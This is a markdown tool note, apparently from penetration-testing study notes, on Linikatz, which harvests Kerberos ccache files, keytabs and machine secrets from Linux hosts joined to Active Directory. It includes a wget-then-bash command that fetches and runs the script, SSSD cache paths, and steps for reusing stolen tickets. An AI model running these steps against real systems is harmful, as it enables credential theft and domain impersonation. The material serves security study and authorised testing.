---
tool: Linikatz
slug: linikatz
stages: [post-compromise]
targets: [linux, windows]
category: Mimikatz for domain-joined UNIX
platforms: [linux]
services: [kerberos]
ports: []
tags: [active directory, kerberos, credentials, ccache, keytab, post-exploitation]
attack: [T1003.007, T1558, T1550.003]
summary: Cisco's answer to Mimikatz for UNIX hosts integrated with Active Directory. Run as root, it sweeps every common integration — SSSD, FreeIPA, Samba, Winbind, Vintela — and pulls out the Kerberos material each one caches: ccache files, keytabs, machine secrets and cached hashes, dropped into a folder ready to reuse.
references:
  - Linikatz on GitHub | https://github.com/CiscoCXSecurity/linikatz
  - MIT Kerberos — credential cache | https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html
---

## When to reach for it

You have root on a domain-joined Linux host and want every credential it holds in one pass, rather than hunting caches and keytabs by hand. Linikatz knows where each AD-integration stack stores its secrets — including the SSSD database and the machine account's own tickets — and collects them for you.

## Key flags

- Run as **root**; it reads other users' process memory and protected caches.
- No arguments needed — it enumerates each integration (SSSD, FreeIPA, Samba, Winbind, Vintela/VAS, PBIS) in turn.
- Writes recovered material into a `linikatz.<random>` directory as ccache and keytab files.
- Also surfaces the machine account's TGT (`HOSTNAME$@REALM`) from the SSSD cache.

## Commands

```bash
# Fetch and run against the local host
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
bash ./linikatz.sh
```

## Workflow

1. Escalate to root first — without it, most sources are unreadable.
2. Run `linikatz.sh` and let it enumerate every integration present.
3. Collect the ccache and keytab files it drops into its output directory.
4. Reuse them exactly as in the [Pass the Ticket (Linux) note](/cpts/#tool-linux-ticket-abuse): `export KRB5CCNAME=...` or `kinit -t`, then `-k` against the domain.
5. Feed any recovered keytabs to [KeyTabExtract](/cpts/#tool-keytabextract) for passable or crackable hashes.

## Notes

The high-value find is usually the machine account's TGT in the SSSD cache (`/var/lib/sss/db/ccache_REALM`) — it lets you impersonate the computer object against the DC. Linikatz is a collector, not an exploiter: it gathers the material, and you reuse it with the ticket and hash tooling. On modern systemd/SSSD builds some legacy sources are empty, but the SSSD database and on-disk keytabs are reliable wins. It is the AD-integrated counterpart to [mimipenguin](/cpts/#tool-mimipenguin), which scrapes cleartext passwords from Linux process memory.
